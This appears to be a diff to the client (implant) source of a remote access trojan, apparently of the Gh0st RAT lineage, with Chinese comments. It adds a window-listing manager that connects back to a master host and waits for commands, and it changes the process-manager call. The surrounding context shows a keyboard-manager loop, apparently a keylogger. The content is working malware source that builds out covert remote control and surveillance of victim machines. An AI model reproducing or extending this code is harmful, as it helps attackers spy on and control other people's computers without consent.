@@ -110,18 +110,34 @@ DWORD WINAPI Loop_KeyboardManager(SOCKET sRemote)
 	return 0;
 }
 
+//进程遍历回调函数
 DWORD WINAPI Loop_SystemManager(SOCKET sRemote)
 {	
 	CClientSocket	socketClient;
 	if (!socketClient.Connect(CKernelManager::m_strMasterHost, CKernelManager::m_nMasterPort))
 		return -1;
 	
-	CSystemManager	manager(&socketClient);
+	CSystemManager	manager(&socketClient, COMMAND_SYSTEM);
 	
 	socketClient.run_event_loop();
 
 	return 0;
 }
+
+//窗口线程回调函数
+DWORD WINAPI Loop_WindowManager(SOCKET sRemote)
+{
+	CClientSocket	socketClient;
+	if (!socketClient.Connect(CKernelManager::m_strMasterHost, CKernelManager::m_nMasterPort))
+		return -1;
+
+	CSystemManager	manager(&socketClient, COMMAND_WSLIST);
+
+	socketClient.run_event_loop();
+
+	return 0;
+}
+
 
 DWORD WINAPI Loop_DownManager(LPVOID lparam)
 {
